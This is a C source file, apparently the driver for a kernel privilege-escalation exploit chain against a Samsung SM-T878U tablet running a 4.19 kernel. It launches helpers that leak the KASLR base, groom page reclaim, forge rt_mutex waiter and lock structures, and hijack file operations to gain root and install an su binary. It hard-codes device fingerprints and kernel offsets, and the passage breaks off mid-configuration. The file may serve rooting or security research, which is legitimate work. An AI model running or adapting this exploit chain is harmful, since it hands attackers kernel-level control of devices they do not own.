// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 yoyicue

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/system_properties.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "../exploit/offset.h"

#define REMOTE_TARGET  "/data/local/tmp/ionstack_perf_target"
#define REMOTE_PRELOAD "/data/local/tmp/ionstack_preload.so"
#define REMOTE_PROBE   "/data/local/tmp/cve43499_chainwalk_probe_arm32"
#define REMOTE_SU      "/data/local/tmp/su"
#define REMOTE_SOCKET  "/data/local/tmp/temp_su.sock"

#define HELPER_ATTEMPTS 6
#define HELPER_TIMEOUT_MS 300000U
#define CAPTURE_TIMEOUT_MS 900000U
#define TARGET_READY_TIMEOUT_MS 30000U
#define ROOT_READY_TIMEOUT_MS 30000U
#define CAPTURE_WORKERS 6U

#define EXPECTED_DEVICE "gts7l"
#define EXPECTED_KERNEL_RELEASE "4.19.113"
#define EXPECTED_KERNEL_VERSION \
  "#1 SMP PREEMPT Wed May 15 19:38:01 KST 2024"
#define EXPECTED_SDK "33"
#define EXPECTED_FINGERPRINT \
  "samsung/gts7lsqwnc/gts7l:13/TP1A.220624.014/" \
  "T878USQS8DXE1:user/release-keys"
#define EXPECTED_INIT_TASK_OFF 0x31ad980ULL
/*
 * The legacy chainwalk probe rewrites waiter->task/lock/prio through the
 * io_submit iocb words. Keep its mapped prio aligned with the held-page fake
 * waiter shape or sched_setattr consumes a mixed layout.
 */
#define LEGACY_CHAINWALK_WAITER_PRIO "130"

struct env_pair {
  const char *name;
  const char *value;
};

static int env_truthy_name(const char *name) {
  const char *value = getenv(name);
  return value && *value && strcmp(value, "0") != 0;
}

static const char *effective_t878u_lock_owner_mode(const char *requested) {
  static int warned_once;
  const char *mode = requested && *requested ? requested : "init-task";

  if (strcmp(mode, "none") != 0 || env_truthy_name("IONSTACK_T878U_ALLOW_OWNERLESS_PI")) {
    return mode;
  }

  if (!warned_once) {
    warned_once = 1;
    fprintf(stderr,
            "[reroot] clamp IONSTACK_FOPS_LOCK_OWNER_MODE=none -> init-task "
            "on SM-T878U; ownerless rt_mutex_adjust_prio_chain reaches "
            "rt_mutex_top_waiter(lock) consistency BUGs on this 4.19 tree. "
            "Set IONSTACK_T878U_ALLOW_OWNERLESS_PI=1 to override.\n");
  }

  return "init-task";
}

static const char *effective_t878u_probe_stage(const char *requested,
                                               const char *post_return,
                                               const char *sendmsg_shape,
                                               const char *isolated_hold) {
  static int warned_sendmsg_once;
  static int warned_select_hold_once;
  const char *stage = requested && *requested ? requested : "";
  int sendmsg_fake_waiter =
      post_return && *post_return &&
      strcmp(post_return, "sendmsg-dgram-name-block") == 0 &&
      sendmsg_shape && *sendmsg_shape &&
      (strcmp(sendmsg_shape, "fake-waiter") == 0 ||
       strcmp(sendmsg_shape, "fake-waiter-tree") == 0);
  int compat_select_hold =
      isolated_hold && *isolated_hold &&
      (strcmp(isolated_hold, "select320") == 0 ||
       strcmp(isolated_hold, "pselect320") == 0);
  int blocking_post_return =
      post_return && *post_return &&
      (strcmp(post_return, "readv-block-small") == 0 ||
       strcmp(post_return, "readv-block-large") == 0 ||
       strcmp(post_return, "epoll-block") == 0 ||
       strcmp(post_return, "sendmsg-block") == 0 ||
       strcmp(post_return, "sendmmsg-block") == 0 ||
       strcmp(post_return, "sendmsg-dgram-name-block") == 0 ||
       strcmp(post_return, "sendmmsg-name-block") == 0 ||
       strcmp(post_return, "sigsuspend-block") == 0);

  if (env_truthy_name("IONSTACK_T878U_ALLOW_DIRECT_CHAINWALK") ||
      strcmp(stage, "chainwalk") != 0) {
    return stage;
  }

  if (sendmsg_fake_waiter) {
    if (!warned_sendmsg_once) {
      warned_sendmsg_once = 1;
      fprintf(stderr,
              "[reroot] clamp IONSTACK_PROBE_STAGE=chainwalk -> "
              "waiter-exit-chainwalk on SM-T878U for sendmsg fake-waiter "
              "routes; direct chainwalk still reboots this 4.19 tree in live "
              "tests before any fops hijack lands. "
              "Set IONSTACK_T878U_ALLOW_DIRECT_CHAINWALK=1 to override.\n");
    }
    return "waiter-exit-chainwalk";
  }

  if (compat_select_hold && blocking_post_return) {
    if (!warned_select_hold_once) {
      warned_select_hold_once = 1;
      fprintf(stderr,
              "[reroot] clamp IONSTACK_PROBE_STAGE=chainwalk -> "
              "waiter-exit-chainwalk on SM-T878U for waiter-post-return=%s "
              "+ waiter-isolated-hold=%s; live tests rebooted the 4.19 tree "
              "before any fops hijack landed. "
              "Set IONSTACK_T878U_ALLOW_DIRECT_CHAINWALK=1 to override.\n",
              post_return, isolated_hold);
    }
    return "waiter-exit-chainwalk";
  }

  return stage;
}

static void append_env_override(struct env_pair *environment, size_t *env_count,
                                size_t env_cap, const char *name) {
  const char *value = getenv(name);
  if (!value || !*value || *env_count >= env_cap) {
    return;
  }
  environment[(*env_count)++] = (struct env_pair){name, value};
}

static void append_reclaim_env_overrides(struct env_pair *environment,
                                         size_t *env_count,
                                         size_t env_cap) {
  static const char *const names[] = {
      "IONSTACK_RECLAIM_PERF_COUNTERS",
      "IONSTACK_RECLAIM_PERF_ALLOC_ID",
      "IONSTACK_RECLAIM_PERF_FREE_ID",
      "IONSTACK_RECLAIM_PERF_FRAG_GFP",
      "IONSTACK_RECLAIM_PERF_EXTFRAG_ID",
      "IONSTACK_RECLAIM_SPLICE_ORDER_GATE",
      "IONSTACK_RECLAIM_REQUIRE_ORDER3",
      "IONSTACK_RECLAIM_PFN_IDENTITY",
      "IONSTACK_RECLAIM_PHYS_PFN_START",
      "IONSTACK_RECLAIM_PHYS_PFN_END",
      "IONSTACK_RECLAIM_LINEAR_SEGMENT_PAGES",
      "IONSTACK_RECLAIM_LINEAR_MAP_BASE",
      "IONSTACK_EL1_CANDIDATE_GATE",
      "IONSTACK_EL1_MEMSTART",
      "IONSTACK_EL1_DRAM_START",
      "IONSTACK_EL1_DRAM_END",
      "IONSTACK_EL1_MAPPED_START",
      "IONSTACK_EL1_MAPPED_END",
      "IONSTACK_EL1_MIN_COLLISIONS",
  };
  for (size_t i = 0; i < sizeof(names) / sizeof(names[0]); ++i) {
    append_env_override(environment, env_count, env_cap, names[i]);
  }
}

struct child_proc {
  pid_t pid;
  int fd;
  int exited;
  int status;
  char partial[16384];
  size_t partial_len;
};

struct target_state {
  int ready;
  int root_ready;
  pid_t remote_pid;
  uint64_t kaslr_base;
  uint64_t task;
  uint64_t cred;
  unsigned cred_hits;
  unsigned base_hits;
};

struct helper_state {
  int hold_ready;
  int fresh_ok;
  int order_ok;
  int pfn_ok;
  int content_ok;
  uint64_t hold_base;
  uint64_t fake_lock;
  uint64_t fake_w0;
  uint64_t fake_task;
  uint64_t fake_fops;
  uint64_t binwrite;
  uint64_t fresh_candidate;
  uint64_t target_pfn;
  uint64_t alloc_pfn;
  unsigned fresh_wanted;
  unsigned fresh_matches;
};

struct capture_state {
  int saw_result;
  int ok;
  int su_ready;
  int restore_ok;
};

struct gate_state {
  int abi_gate;
  int overlap_gate;
  int identity_gate;
  int consumer_gate;
  int write_gate;
};

struct trace_session {
  int started;
  int dumped;
};

typedef void (*line_callback)(const char *line, void *opaque);

static void reap_child(struct child_proc *child);
static int drain_child(struct child_proc *child, line_callback callback,
                       void *opaque);

#define TRACEFS_ROOT "/sys/kernel/tracing"
#define TRACEFS_TRACE TRACEFS_ROOT "/trace"
#define TRACEFS_TRACING_ON TRACEFS_ROOT "/tracing_on"
#define TRACEFS_CURRENT_TRACER TRACEFS_ROOT "/current_tracer"
#define TRACEFS_SET_FILTER TRACEFS_ROOT "/set_ftrace_filter"

static const char *const tracefs_filter =
    "pipe_read\n"
    "do_io_submit\n"
    "io_submit_one\n"
    "task_blocks_on_rt_mutex\n"
    "rt_mutex_adjust_prio_chain\n"
    "futex_wait_requeue_pi\n"
    "futex_requeue\n";

static volatile sig_atomic_t stop_requested;

static void on_signal(int signo) {
  (void)signo;
  stop_requested = 1;
}

static uint64_t monotonic_ms(void) {
  struct timespec ts;
  if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
    return 0;
  }
  return (uint64_t)ts.tv_sec * 1000U + (uint64_t)ts.tv_nsec / 1000000U;
}

static void sleep_ms(unsigned ms) {
  struct timespec delay = {
      .tv_sec = ms / 1000U,
      .tv_nsec = (long)(ms % 1000U) * 1000000L,
  };
  while (nanosleep(&delay, &delay) != 0 && errno == EINTR &&
         !stop_requested) {
  }
}

static unsigned configured_capture_workers(void) {
  const char *value = getenv("IONSTACK_CAPTURE_WORKERS");
  if (!value || !*value) {
    return CAPTURE_WORKERS;
  }
  char *end = NULL;
  errno = 0;
  unsigned long parsed = strtoul(value, &end, 10);
  if (errno != 0 || end == value || (end && *end != '\0')) {
    fprintf(stderr,
            "[reroot] invalid IONSTACK_CAPTURE_WORKERS=%s; using default=%u\n",
            value, CAPTURE_WORKERS);
    return CAPTURE_WORKERS;
  }
  if (parsed > CAPTURE_WORKERS) {
    fprintf(stderr,
            "[reroot] clamping IONSTACK_CAPTURE_WORKERS=%lu to max=%u\n",
            parsed, CAPTURE_WORKERS);
    parsed = CAPTURE_WORKERS;
  }
  return (unsigned)parsed;
}

static uint64_t p0_data_alias_const_u64(uint64_t image_addr) {
  uint64_t off = image_addr - KIMAGE_TEXT_BASE;
  uint64_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

static int read_first_line(const char *path, char *buffer, size_t size) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  ssize_t got = read(fd, buffer, size - 1);
  int saved_errno = errno;
  close(fd);
  if (got <= 0) {
    errno = saved_errno;
    return -1;
  }
  buffer[got] = '\0';
  char *newline = strpbrk(buffer, "\r\n");
  if (newline) {
    *newline = '\0';
  }
  return 0;
}

static int write_all_fd(int fd, const void *data, size_t size) {
  const char *cursor = data;
  while (size > 0) {
    ssize_t wrote = write(fd, cursor, size);
    if (wrote < 0 && errno == EINTR) {
      continue;
    }
    if (wrote <= 0) {
      return -1;
    }
    cursor += wrote;
    size -= (size_t)wrote;
  }
  return 0;
}

static int write_text_file(const char *path, const char *text, int truncate) {
  int flags = O_WRONLY | O_CLOEXEC;
  if (truncate) {
    flags |= O_TRUNC;
  }
  int fd = open(path, flags);
  if (fd < 0) {
    return -1;
  }
  int rc = 0;
  size_t size = strlen(text);
  if (size > 0 && write_all_fd(fd, text, size) != 0) {
    rc = -1;
  }
  int saved_errno = errno;
  close(fd);
  errno = saved_errno;
  return rc;
}

static int read_file_into_buffer(const char *path, char *buffer, size_t size) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  ssize_t got = read(fd, buffer, size - 1);
  int saved_errno = errno;
  close(fd);
  if (got < 0) {
    errno = saved_errno;
    return -1;
  }
  buffer[got] = '\0';
  return 0;
}

static void finalize_gate_state(struct gate_state *gates) {
  gates->write_gate = gates->abi_gate && gates->overlap_gate &&
                      gates->identity_gate && gates->consumer_gate;
}

static int parse_gate_value(const char *argument,
                            const char *prefix,
                            int *value_out) {
  size_t prefix_len = strlen(prefix);
  if (strncmp(argument, prefix, prefix_len) != 0) {
    return 0;
  }
  const char *value = argument + prefix_len;
  if (strcmp(value, "0") == 0) {
    *value_out = 0;
    return 1;
  }
  if (strcmp(value, "1") == 0) {
    *value_out = 1;
    return 1;
  }
  fprintf(stderr, "[reroot] invalid gate value for %s: %s\n", prefix, value);
  return -1;
}

static const char *route_name(int legacy_route, int observe_only) {
  if (observe_only) {
    return legacy_route ? "legacy-observe" : "observe-only";
  }
  return legacy_route ? "legacy-capture-probe" : "t878u-pselect-root";
}

static void log_gate_state(const struct gate_state *gates,
                           const char *route,
                           int observe_only) {
  printf("[reroot] GATES route=%s observe=%d abi_gate=%d overlap_gate=%d "
         "identity_gate=%d consumer_gate=%d write_gate=%d\n",
         route, observe_only, gates->abi_gate, gates->overlap_gate,
         gates->identity_gate, gates->consumer_gate, gates->write_gate);
}

static void log_blocked_reasons(const struct gate_state *gates) {
  if (!gates->abi_gate) {
    fprintf(stderr,
            "[reroot] blocked_abi reason=missing_matched_vmlinux_or_debug_info\n");
  }
  if (!gates->overlap_gate) {
    fprintf(stderr,
            "[reroot] blocked_overlap reason=no_verified_waiter_iocb_overlap\n");
  }
  if (!gates->identity_gate) {
    fprintf(stderr,
            "[reroot] blocked_identity reason=no_direct_map_identity_proof\n");
  }
  if (!gates->consumer_gate) {
    fprintf(stderr,
            "[reroot] blocked_consumer reason=no_verified_consumer_trace\n");
  }
}

static void log_no_go(const struct gate_state *gates,
                      const char *route,
                      const char *phase) {
  log_blocked_reasons(gates);
  fprintf(stderr,
          "[reroot] no_go route=%s phase=%s abi_gate=%d overlap_gate=%d "
          "identity_gate=%d consumer_gate=%d write_gate=%d\n",
          route, phase, gates->abi_gate, gates->overlap_gate,
          gates->identity_gate, gates->consumer_gate, gates->write_gate);
}

static int tracefs_controls_available(void) {
  return access(TRACEFS_TRACE, R_OK | W_OK) == 0 &&
         access(TRACEFS_TRACING_ON, W_OK) == 0 &&
         access(TRACEFS_CURRENT_TRACER, W_OK) == 0 &&
         access(TRACEFS_SET_FILTER, W_OK) == 0;
}

static int tracefs_begin_capture(struct trace_session *session,
                                 char *reason,
                                 size_t reason_size) {
  memset(session, 0, sizeof(*session));
  if (!tracefs_controls_available()) {
    snprintf(reason, reason_size, "missing_tracefs_controls");
    return -1;
  }
  if (write_text_file(TRACEFS_TRACING_ON, "0\n", 1) != 0 ||
      write_text_file(TRACEFS_CURRENT_TRACER, "nop\n", 1) != 0 ||
      write_text_file(TRACEFS_SET_FILTER, tracefs_filter, 1) != 0 ||
      write_text_file(TRACEFS_TRACE, "", 1) != 0 ||
      write_text_file(TRACEFS_CURRENT_TRACER, "function\n", 1) != 0 ||
      write_text_file(TRACEFS_TRACING_ON, "1\n", 1) != 0) {
    snprintf(reason, reason_size, "tracefs_setup_failed errno=%d", errno);
    return -1;
  }
  session->started = 1;
  printf("[reroot] tracefs_start tracer=function filter=stock_consumer\n");
  return 0;
}

static void tracefs_end_capture(struct trace_session *session) {
  char trace_buffer[32768];
  if (!session->started) {
    return;
  }
  write_text_file(TRACEFS_TRACING_ON, "0\n", 1);
  if (read_file_into_buffer(TRACEFS_TRACE, trace_buffer,
                            sizeof(trace_buffer)) == 0 &&
      trace_buffer[0] != '\0') {
    printf("[reroot] trace_dump_begin\n%s", trace_buffer);
    size_t trace_len = strlen(trace_buffer);
    if (trace_len == 0 || trace_buffer[trace_len - 1] != '\n') {
      printf("\n");
    }
    printf("[reroot] trace_dump_end\n");
    session->dumped = 1;
  } else {
    fprintf(stderr, "[reroot] blocked_consumer reason=empty_trace_buffer\n");
  }
}

static int wait_for_child_exit(struct child_proc *child, unsigned timeout_ms) {
  uint64_t deadline = monotonic_ms() + timeout_ms;
  while (!stop_requested && monotonic_ms() < deadline) {
    if (child->fd >= 0) {
      struct pollfd pfd = {.fd = child->fd, .events = POLLIN | POLLHUP};
      poll(&pfd, 1, 250);
    } else {
      sleep_ms(25);
    }
    drain_child(child, NULL, NULL);
    reap_child(child);
    if (child->exited && child->fd < 0) {
      return 0;
    }
  }
  return -1;
}

static int set_nonblocking(int fd) {
  int flags = fcntl(fd, F_GETFL, 0);
  if (flags < 0) {
    return -1;
  }
  return fcntl(fd, F_SETFL, flags | O_NONBLOCK);
}

static void child_init(struct child_proc *child) {
  memset(child, 0, sizeof(*child));
  child->pid = -1;
  child->fd = -1;
}

static int spawn_child(struct child_proc *child, const char *path,
                       char *const argv[], const struct env_pair *environment,
                       size_t environment_count) {
  int pipe_fds[2];
  if (pipe2(pipe_fds, O_CLOEXEC) != 0) {
    return -1;
  }
  pid_t pid = fork();
  if (pid < 0) {
    int saved_errno = errno;
    close(pipe_fds[0]);
    close(pipe_fds[1]);
    errno = saved_errno;
    return -1;
  }
  if (pid == 0) {
    setpgid(0, 0);
    dup2(pipe_fds[1], STDOUT_FILENO);
    dup2(pipe_fds[1], STDERR_FILENO);
    close(pipe_fds[0]);
    close(pipe_fds[1]);
    clearenv();
    setenv("PATH", "/system/bin:/system_ext/bin:/vendor/bin", 1);
    for (size_t i = 0; i < environment_count; ++i) {
      if (setenv(environment[i].name, environment[i].value, 1) != 0) {
        dprintf(STDERR_FILENO, "setenv %s failed: %s\n",
                environment[i].name, strerror(errno));
        _exit(126);
      }
    }
    execv(path, argv);
    dprintf(STDERR_FILENO, "exec %s failed: %s\n", path, strerror(errno));
    _exit(127);
  }

  close(pipe_fds[1]);
  setpgid(pid, pid);
  set_nonblocking(pipe_fds[0]);
  child_init(child);
  child->pid = pid;
  child->fd = pipe_fds[0];
  return 0;
}

static void reap_child(struct child_proc *child) {
  if (child->pid <= 0 || child->exited) {
    return;
  }
  int status = 0;
  pid_t got = waitpid(child->pid, &status, WNOHANG);
  if (got == child->pid) {
    child->exited = 1;
    child->status = status;
  }
}

static int child_exit_code(const struct child_proc *child) {
  if (!child->exited) {
    return -1;
  }
  if (WIFEXITED(child->status)) {
    return WEXITSTATUS(child->status);
  }
  if (WIFSIGNALED(child->status)) {
    return 128 + WTERMSIG(child->status);
  }
  return 255;
}

static void stop_child(struct child_proc *child) {
  if (child->pid > 0 && !child->exited) {
    kill(-child->pid, SIGTERM);
    uint64_t deadline = monotonic_ms() + 2000U;
    while (monotonic_ms() < deadline) {
      reap_child(child);
      if (child->exited) {
        break;
      }
      sleep_ms(25);
    }
    if (!child->exited) {
      kill(-child->pid, SIGKILL);
      while (waitpid(child->pid, &child->status, 0) < 0 && errno == EINTR) {
      }
      child->exited = 1;
    }
  }
  if (child->fd >= 0) {
    close(child->fd);
    child->fd = -1;
  }
}

static void emit_line(struct child_proc *child, const char *line, size_t len,
                      line_callback callback, void *opaque) {
  char local[16384];
  if (len >= sizeof(local)) {
    len = sizeof(local) - 1;
  }
  memcpy(local, line, len);
  local[len] = '\0';
  if (len > 0 && local[len - 1] == '\r') {
    local[len - 1] = '\0';
  }
  printf("%s\n", local);
  if (callback) {
    callback(local, opaque);
  }
  (void)child;
}

static int drain_child(struct child_proc *child, line_callback callback,
                       void *opaque) {
  if (child->fd < 0) {
    return 0;
  }
  char buffer[4096];
  int read_any = 0;
  for (;;) {
    ssize_t got = read(child->fd, buffer, sizeof(buffer));
    if (got > 0) {
      read_any = 1;
      for (ssize_t i = 0; i < got; ++i) {
        char ch = buffer[i];
        if (ch == '\n') {
          emit_line(child, child->partial, child->partial_len, callback,
                    opaque);
          child->partial_len = 0;
        } else if (child->partial_len + 1 < sizeof(child->partial)) {
          child->partial[child->partial_len++] = ch;
        }
      }
      continue;
    }
    if (got == 0) {
      if (child->partial_len > 0) {
        emit_line(child, child->partial, child->partial_len, callback,
                  opaque);
        child->partial_len = 0;
      }
      close(child->fd);
      child->fd = -1;
      break;
    }
    if (errno == EINTR) {
      continue;
    }
    if (errno == EAGAIN || errno == EWOULDBLOCK) {
      break;
    }
    close(child->fd);
    child->fd = -1;
    break;
  }
  reap_child(child);
  return read_any;
}

static int wait_for_child_condition(struct child_proc *child,
                                    unsigned timeout_ms,
                                    line_callback callback, void *opaque,
                                    const int *condition) {
  uint64_t deadline = monotonic_ms() + timeout_ms;
  while (!stop_requested && monotonic_ms() < deadline) {
    if (condition && *condition) {
      return 0;
    }
    struct pollfd pfd = {.fd = child->fd, .events = POLLIN | POLLHUP};
    int poll_rc = child->fd >= 0 ? poll(&pfd, 1, 250) : 0;
    if (poll_rc > 0 || child->fd < 0) {
      drain_child(child, callback, opaque);
    }
    reap_child(child);
    if (child->exited && child->fd < 0) {
      return condition && *condition ? 0 : -1;
    }
  }
  return condition && *condition ? 0 : -1;
}

static int run_capture_command(const char *path, char *const argv[],
                               char *output, size_t output_size,
                               unsigned timeout_ms) {
  struct child_proc child;
  child_init(&child);
  if (spawn_child(&child, path, argv, NULL, 0) != 0) {
    return -1;
  }
  size_t used = 0;
  uint64_t deadline = monotonic_ms() + timeout_ms;
  while (monotonic_ms() < deadline && (!child.exited || child.fd >= 0)) {
    struct pollfd pfd = {.fd = child.fd, .events = POLLIN | POLLHUP};
    if (child.fd >= 0) {
      poll(&pfd, 1, 100);
      char buffer[1024];
      for (;;) {
        ssize_t got = read(child.fd, buffer, sizeof(buffer));
        if (got > 0) {
          size_t copy = (size_t)got;
          if (copy > output_size - 1 - used) {
            copy = output_size - 1 - used;
          }
          if (copy > 0) {
            memcpy(output + used, buffer, copy);
            used += copy;
          }
          continue;
        }
        if (got == 0) {
          close(child.fd);
          child.fd = -1;
        }
        break;
      }
    }
    reap_child(&child);
  }
  output[used] = '\0';
  if (!child.exited) {
    stop_child(&child);
    return -1;
  }
  if (child.fd >= 0) {
    close(child.fd);
  }
  return child_exit_code(&child);
}

static int existing_root_works(void) {
  if (access(REMOTE_SU, X_OK) != 0) {
    return 0;
  }
  char *argv[] = {(char *)REMOTE_SU, "-c", "id", NULL};
  char output[4096];
  int rc = run_capture_command(REMOTE_SU, argv, output, sizeof(output), 5000);
  if (rc == 0 && strstr(output, "uid=0(root)")) {
    printf("[reroot] existing root verified: %s", output);
    if (!strchr(output, '\n')) {
      printf("\n");
    }
    return 1;
  }
  return 0;
}

static void target_line(const char *line, void *opaque) {
  struct target_state *state = opaque;
  const char *ready = strstr(line, "[perf-target] READY ");
  if (ready) {
    int pid = 0;
    uint64_t base = 0;
    uint64_t task = 0;
    uint64_t cred = 0;
    unsigned task_hits = 0;
    unsigned cred_hits = 0;
    unsigned base_hits = 0;
    size_t samples = 0;
    int fields = sscanf(
        ready,
        "[perf-target] READY pid=%d kaslr_base=0x%" SCNx64
        " task=0x%" SCNx64 " task_hits=%u cred=0x%" SCNx64
        " cred_hits=%u base_hits=%u samples=%zu",
        &pid, &base, &task, &task_hits, &cred, &cred_hits, &base_hits,
        &samples);
    if (fields == 8 && pid > 0 && base != 0 && base_hits >= 2) {
      state->ready = 1;
      state->remote_pid = pid;
      state->kaslr_base = base;
      state->task = task;
      state->cred = cred;
      state->cred_hits = cred_hits;
      state->base_hits = base_hits;
    }
  }
  if (strstr(line, "[perf-target] ROOT_READY ")) {
    state->root_ready = 1;
  }
}

static int line_value_is_one(const char *line, const char *key) {
  const char *where = strstr(line, key);
  if (!where) {
    return 0;
  }
  where += strlen(key);
  return *where == '1' && (where[1] == '\0' || where[1] == ' ');
}

static void helper_line(const char *line, void *opaque) {
  struct helper_state *state = opaque;
  const char *fresh = strstr(line, "ks prepare-fresh-set validation ");
  if (fresh) {
    int ok = 0;
    uint64_t candidate = 0;
    unsigned wanted = 0;
    unsigned matches = 0;
    int fields = sscanf(fresh,
                        "ks prepare-fresh-set validation ok=%d candidate=%"
                        SCNx64 " wanted=%u matches=%u",
                        &ok, &candidate, &wanted, &matches);
    if (fields == 4) {
      state->fresh_ok = ok == 1 && wanted > 0 && matches >= wanted;
      state->fresh_candidate = candidate;
      state->fresh_wanted = wanted;
      state->fresh_matches = matches;
    }
  }

  const char *order = strstr(line, "reclaim-order-gate sends=");
  if (order) {
    unsigned sends = 0;
    unsigned success = 0;
    unsigned fail = 0;
    int accepted = 0;
    if (sscanf(order,
               "reclaim-order-gate sends=%u order3_success=%u "
               "order3_fail=%u accepted=%d",
               &sends, &success, &fail, &accepted) == 4) {
      state->order_ok = accepted == 1 && sends > 0 && success == sends &&
                        fail == 0;
    }
  }

  const char *pfn = strstr(line, "reclaim-pfn-result ");
  if (pfn) {
    unsigned candidates = 0;
    unsigned free_hits = 0;
    unsigned alloc_hits = 0;
    unsigned matched_hits = 0;
    uint64_t target = 0;
    uint64_t alloc = 0;
    int matched = 0;
    if (sscanf(pfn,
               "reclaim-pfn-result candidates=%u free_hits=%u alloc_hits=%u "
               "matched_hits=%u target_pfn=%" SCNx64
               " alloc_pfn=%" SCNx64 " matched=%d",
               &candidates, &free_hits, &alloc_hits, &matched_hits, &target,
               &alloc, &matched) == 7) {
      state->pfn_ok = matched == 1 && candidates > 0 && free_hits > 0 &&
                      alloc_hits > 0 && matched_hits > 0 && target == alloc;
      state->target_pfn = target;
      state->alloc_pfn = alloc;
    }
  }

  const char *content = strstr(line, "reclaim-content-validate ");
  if (content && line_value_is_one(content, "ok=")) {
    state->content_ok = 1;
  }

  const char *hold = strstr(line, "stage fops-page-hold hold-ready ");
  if (hold) {
    uint64_t base = 0;
    uint64_t fake_lock = 0;
    uint64_t fake_w0 = 0;
    uint64_t fake_task = 0;
    uint64_t fake_fops = 0;
    uint64_t binwrite = 0;
    int fields = sscanf(
        hold,
        "stage fops-page-hold hold-ready base=%" SCNx64
        " fake_lock=%" SCNx64 " fake_w0=%" SCNx64
        " fake_task=%" SCNx64 " fake_fops=%" SCNx64
        " binwrite=%" SCNx64,
        &base, &fake_lock, &fake_w0, &fake_task, &fake_fops, &binwrite);
    if (fields == 6 && base && fake_lock && fake_w0 && fake_task &&
        fake_fops && binwrite) {
      state->hold_base = base;
      state->fake_lock = fake_lock;
      state->fake_w0 = fake_w0;
      state->fake_task = fake_task;
      state->fake_fops = fake_fops;
      state->binwrite = binwrite;
      state->hold_ready = 1;
    }
  }
}

static void capture_line(const char *line, void *opaque) {
  struct capture_state *state = opaque;
  const char *result = strstr(line, "stage-fops-write-root-result ");
  int is_check_stage = 0;
  if (!result) {
    result = strstr(line, "stage-fops-check-result ");
    is_check_stage = result != NULL;
  }
  if (!result) {
    return;
  }
  state->saw_result = 1;
  state->ok = line_value_is_one(result, "ok=");
  if (!is_check_stage) {
    state->su_ready = line_value_is_one(result, "su_ready=");
    const char *restore = strstr(result, " restore=");
    if (restore) {
      unsigned long value = strtoul(restore + strlen(" restore="), NULL, 0);
      state->restore_ok = value == 8;
    }
  } else {
    state->su_ready = 0;
    const char *restore = strstr(result, " restore=");
    if (restore) {
      unsigned long value = strtoul(restore + strlen(" restore="), NULL, 0);
      state->restore_ok = value == 8;
    }
  }
}

static int spawn_target(struct child_proc *child, unsigned hold_sec) {
  char hold_arg[64];
  snprintf(hold_arg, sizeof(hold_arg), "--hold-sec=%u", hold_sec);
  char *argv[] = {(char *)REMOTE_TARGET, "--workload=getresuid",
                  "--sample-ms=2500", "--freq=8000", "--attempts=6",
                  hold_arg, NULL};
  return spawn_child(child, REMOTE_TARGET, argv, NULL, 0);
}

static int spawn_holder(struct child_proc *child, uint64_t kaslr_base,
                        unsigned hold_sec, unsigned attempt) {
  char base_value[32];
  char hold_value[32];
  char partial_slabs_value[32];
  char posttarget_sends_value[32];
  const char *fops_pi_waiters = getenv("IONSTACK_FOPS_PI_WAITERS");
  const char *fops_pi_leftmost = getenv("IONSTACK_FOPS_PI_LEFTMOST");
  const char *fops_pi_node_safe = getenv("IONSTACK_FOPS_PI_NODE_SAFE");
  const char *fops_pi_rb_shape = getenv("IONSTACK_FOPS_PI_RB_SHAPE");
  const char *fops_lock_owner_mode = getenv("IONSTACK_FOPS_LOCK_OWNER_MODE");
  const char *fops_lock_waiters = getenv("IONSTACK_FOPS_LOCK_WAITERS");
  const char *fops_wait_lock_word = getenv("IONSTACK_FOPS_WAIT_LOCK_WORD");
  const char *fops_waiter_prio = getenv("IONSTACK_FOPS_WAITER_PRIO");
  const char *fops_waiter_task_mode =
      getenv("IONSTACK_FOPS_WAITER_TASK_MODE");
  const char *page_observe = getenv("IONSTACK_PAGE_OBSERVE");
  const char *page_observe_log = getenv("IONSTACK_PAGE_OBSERVE_LOG");
  const char *effective_owner_mode =
      effective_t878u_lock_owner_mode(fops_lock_owner_mode);
  (void)effective_owner_mode;
  struct env_pair environment[64];
  size_t env_count = 0;
  snprintf(base_value, sizeof(base_value), "0x%016" PRIx64, kaslr_base);
  snprintf(hold_value, sizeof(hold_value), "%u", hold_sec);
  snprintf(partial_slabs_value, sizeof(partial_slabs_value), "%u",
           18U + (attempt > 1 ? (attempt - 1U) * 2U : 0U));
  snprintf(posttarget_sends_value, sizeof(posttarget_sends_value), "%u",
           8192U + (attempt > 1 ? (attempt - 1U) * 1024U : 0U));
  environment[env_count++] =
      (struct env_pair){"IONSTACK_KASLR_BASE", base_value};
  environment[env_count++] = (struct env_pair){"IONSTACK_KS_COLLISIONS", "8"};
  environment[env_count++] = (struct env_pair){"IONSTACK_KS_THREADS", "8"};
  environment[env_count++] = (struct env_pair){"IONSTACK_RECLAIM_CORE", "1"};
  environment[env_count++] =
      (struct env_pair){"IONSTACK_RECLAIM_PARTIAL_SLABS", partial_slabs_value};
  struct env_pair fixed_environment[] = {
      /* T878U: order3 success/fail perf counters are not wired the same as
       * the XPad2 profile, so do not fail-closed on them. Keep content and
       * PFN identity as the reclaim acceptance gates. */
      {"IONSTACK_RECLAIM_SPLICE_ORDER_GATE", "1"},
      {"IONSTACK_RECLAIM_REQUIRE_ORDER3", "0"},
      {"IONSTACK_RECLAIM_PFN_IDENTITY", "0"},
      {"IONSTACK_RECLAIM_RELEASE_PREPARE_EARLY", "1"},
      {"IONSTACK_RECLAIM_TARGET_LAST", "1"},
      {"IONSTACK_RECLAIM_PRETARGET_SENDS", "0"},
      {"IONSTACK_RECLAIM_PRETARGET_HOLD", "1"},
      {"IONSTACK_RECLAIM_PRETARGET_LATE", "1"},
      {"IONSTACK_RECLAIM_POSTTARGET_SEARCH", "1"},
      {"IONSTACK_RECLAIM_POSTTARGET_SENDS", posttarget_sends_value},
      {"IONSTACK_RECLAIM_POSTTARGET_MAX_SOCKETS", "32"},
      {"IONSTACK_RECLAIM_VALIDATE_CONTENT", "1"},
